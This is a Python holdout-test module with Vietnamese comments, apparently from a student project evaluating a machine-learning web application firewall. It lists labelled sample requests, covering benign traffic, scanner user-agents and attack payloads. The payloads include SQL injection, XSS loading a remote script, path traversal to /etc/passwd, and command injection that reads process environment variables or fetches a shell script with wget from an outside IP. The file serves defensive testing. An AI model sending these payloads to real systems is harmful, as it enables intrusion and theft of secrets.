"""
Tập kiểm tra độc lập (holdout) – KHÔNG dùng để huấn luyện.

Viết tay riêng, khác với ml/payloads.py, để trả lời câu hỏi quan trọng nhất khi
bảo vệ đồ án: "mô hình có thực sự tổng quát hóa, hay chỉ học thuộc?"

Mỗi mẫu là một request thật: (method, path, query, headers, body).
Tất cả đều đi qua app.features.build_inspection_text giống hệt lúc chạy.
"""
from app import features

UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
H = {"user-agent": UA, "referer": "http://localhost:8000/pages/courses.html"}

# ── Tấn công chưa từng xuất hiện trong dữ liệu huấn luyện ──────────
HOLDOUT_ATTACKS = [
    # SQLi – biến thể khác
    ("GET", "/api/courses", "search=x' OR 3=3#", H, ""),
    ("GET", "/api/courses/1", "id=99 OR TRUE--", H, ""),
    ("POST", "/api/auth/login", "", H,
     '{"email":"a\' UNION SELECT email,password FROM users#"}'),
    ("GET", "/api/admin/stats", "sort=id/**/DESC,(SELECT/**/1/**/FROM/**/users)", H, ""),
    ("GET", "/api/courses", "q=1';SELECT pg_sleep(9);--", H, ""),
    ("GET", "/api/courses", "filter=' AND 5=(SELECT COUNT(*) FROM pg_catalog.pg_tables)--", H, ""),

    # XSS – biến thể khác
    ("POST", "/api/courses/2/reviews", "", H, '{"comment":"<video><source onerror=alert(9)>"}'),
    ("POST", "/api/lecture-questions/3/answers", "", H,
     '{"content":"<details open ontoggle=alert(1)>"}'),
    ("GET", "/pages/help.html", "topic=<marquee onstart=alert(1)>", H, ""),
    ("POST", "/api/user/profile", "", H, '{"name":"<script src=//evil.js></script>"}'),
    ("GET", "/api/courses", "q=<img/src=`x`/onerror=prompt(1)>", H, ""),

    # Path traversal – biến thể khác
    ("GET", "/uploads/cv/....//....//....//etc/passwd", "", H, ""),
    ("GET", "/api/courses", "doc=..%252f..%252fserver.js", H, ""),
    ("GET", "/uploads/materials/../../db/engpro.sql", "", H, ""),

    # Command injection – biến thể khác
    ("GET", "/api/courses", "name=test && cat /proc/self/environ", H, ""),
    ("POST", "/api/contact", "", H, '{"message":"hello; wget http://198.51.100.7/a.sh"}'),
    ("GET", "/api/courses", "q=$(printf /etc/passwd)", H, ""),

    # Khác
    ("GET", "/.env", "", H, ""),
    ("GET", "/api/courses", "tpl=${{7*7}}", H, ""),
]

# Công cụ quét: payload nằm ở User-Agent nên đây là việc của LỚP LUẬT, không
# phải của mô hình ML (mô hình cố ý không đọc header). Để riêng, không đưa vào
# phép đo của ML cho công bằng.
HOLDOUT_SCANNERS = [
    ("GET", "/api/courses", "", {"user-agent": "sqlmap/1.8.4.2#dev (https://sqlmap.org)"}, ""),
    ("GET", "/", "", {"user-agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"}, ""),
    ("GET", "/pages/login.html", "", {"user-agent": "Nikto/2.5.0"}, ""),
]

# ── Lưu lượng bình thường chưa từng dùng để huấn luyện ────────────
# Cố tình chứa từ khóa nhạy cảm trong ngữ cảnh tiếng Anh hoàn toàn hợp lệ.
HOLDOUT_BENIGN = [
    ("POST", "/api/writing/prompts/7/submit", "", H,
     '{"content":"Many people select a career path before they finish university, and I think that is a mistake."}'),
    ("POST", "/api/writing/prompts/7/submit", "", H,
     '{"content":"The table below shows how many students dropped out of the course last year."}'),
    ("POST", "/api/ai/lectures/12/ask", "", H,
     '{"question":"Could you explain the difference between a trade union and a labour union?"}'),
    ("POST", "/api/ai/lectures/12/ask", "", H,
     '{"question":"In the script of the listening section, where does the speaker mention the deadline?"}'),
    ("POST", "/api/lecture-questions/8/answers", "", H,
     '{"content":"You should insert a comma here and delete the extra word at the end."}'),
    ("POST", "/api/courses/4/reviews", "", H,
     '{"rating":5,"comment":"It\'s the best course I\'ve taken; the teacher explains everything clearly."}'),
    ("POST", "/api/contact", "", H,
     '{"name":"Tran Van B","message":"I would like to order the TOEIC book. Where can I pay?"}'),
    ("GET", "/api/courses", "search=order of adjectives", H, ""),
    ("GET", "/api/courses", "search=drop the ball idiom meaning", H, ""),
    ("GET", "/api/courses", "search=union vs intersection grammar", H, ""),
    ("GET", "/api/user/results", "page=3&limit=20", H, ""),
    ("POST", "/api/auth/login", "", H,
     '{"email":"lan.nguyen@gmail.com","password":"Tieng@nh2024"}'),
    ("POST", "/api/auth/register", "", H,
     '{"name":"Le Thi C","email":"lethic@gmail.com","password":"Hoc#Tot99"}'),
    ("GET", "/api/payments/vnpay/return",
     "vnp_ResponseCode=00&vnp_TxnRef=EP1790000123456&vnp_Amount=120000000", H, ""),
    ("PUT", "/api/user/settings", "", H, '{"lang":"en","aiEnglish":true}'),
    ("GET", "/uploads/materials/1790088831006_vsyjgwltp6.docx", "", H, ""),
    ("POST", "/api/user/lectures/23/progress", "", H, '{"ranges":[[0,125],[130,410]]}'),
    ("GET", "/api/placement/toeic", "", H, ""),
    ("POST", "/api/writing/prompts/mine", "", H,
     '{"title":"My own topic","prompt":"Some schools select students by exam results. Discuss."}'),
    ("GET", "/js/i18n-en.js", "", H, ""),
    # Dạng câu hỏi True/False/Not Given – đặc sản của web luyện thi tiếng Anh.
    # Rất giống payload SQLi kiểu "OR TRUE", nên đây là phép thử báo nhầm quan trọng.
    ("POST", "/api/user/attempts/12", "", H,
     '{"answers":[{"q":1,"a":"true"},{"q":2,"a":"false"},{"q":3,"a":"not given"}]}'),
    ("POST", "/api/lecture-questions/4/answers", "", H,
     '{"content":"Choose true or false for each statement in the reading passage."}'),
    ("GET", "/api/courses", "search=true or false exercises", H, ""),
    # Người dùng thật dùng curl / Postman để thử API – không được coi là tấn công
    ("GET", "/api/public/home", "", {"user-agent": "curl/8.7.1"}, ""),
    ("GET", "/", "", {"user-agent": "curl/8.7.1"}, ""),
    ("GET", "/api/courses", "", {"user-agent": "PostmanRuntime/7.39.0"}, ""),
]


def _text(req):
    """Đầu vào của lớp ML: không gồm header (xem app.features.build_ml_text)."""
    method, path, query, _headers, body = req
    return features.build_ml_text(method, path, query, body)


def as_xy():
    """Trả về (X, y) cho scikit-learn – chỉ gồm phần mà lớp ML chịu trách nhiệm."""
    X = [_text(r) for r in HOLDOUT_ATTACKS] + [_text(r) for r in HOLDOUT_BENIGN]
    y = [1] * len(HOLDOUT_ATTACKS) + [0] * len(HOLDOUT_BENIGN)
    return X, y


def all_requests():
    """Toàn bộ request holdout kèm nhãn, dùng để kiểm thử CẢ BA LỚP của WAF."""
    return ([(r, 1) for r in HOLDOUT_ATTACKS]
            + [(r, 1) for r in HOLDOUT_SCANNERS]
            + [(r, 0) for r in HOLDOUT_BENIGN])
